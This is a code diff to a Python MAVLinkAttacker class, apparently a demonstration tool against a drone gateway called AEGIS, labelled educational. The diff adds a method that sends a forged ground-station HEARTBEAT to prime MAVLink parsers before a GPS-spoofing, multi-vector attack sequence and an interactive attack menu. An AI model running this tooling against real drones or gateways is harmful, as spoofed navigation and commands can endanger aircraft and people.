@@ -108,6 +108,21 @@ class MAVLinkAttacker:
             'total': 0
         }
     
+    def send_heartbeat(self):
+        """Send MAVLink HEARTBEAT to prime downstream parsers"""
+        try:
+            self.mav.mav.heartbeat_send(
+                mavutil.mavlink.MAV_TYPE_GCS,  # Type: Ground Control Station
+                mavutil.mavlink.MAV_AUTOPILOT_INVALID,  # No autopilot
+                0,  # Base mode
+                0,  # Custom mode
+                mavutil.mavlink.MAV_STATE_ACTIVE  # System status
+            )
+            logger.info("📡 Heartbeat sent to prime MAVLink parser")
+            time.sleep(0.1)  # Brief delay for parser initialization
+        except Exception as e:
+            logger.warning(f"⚠️  Heartbeat send failed: {e}")
+    
     def attack_gps_spoofing(self, fake_lat: float, fake_lon: float, fake_alt: float):
         """
         Attack 1: GPS Spoofing
@@ -329,6 +344,9 @@ class MAVLinkAttacker:
         logger.info("=" * 70)
         logger.info("Launching multi-vector attack...")
         
+        # Send heartbeat first to prime parser
+        self.send_heartbeat()
+        
         # Attack 1: GPS spoofing (mislead navigation)
         logger.info("\n[1/4] Phase 1: GPS Spoofing")
         self.attack_gps_spoofing(
@@ -380,6 +398,9 @@ class MAVLinkAttacker:
         print(f"Target: AEGIS Gateway {self.target_host}:{self.target_port}")
         print("="*70)
         print("\n⚠️  FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY ⚠️\n")
+        
+        # Send initial heartbeat to prime MAVLink parser
+        self.send_heartbeat()
         
         while True:
             print("\nSelect an attack to launch:")
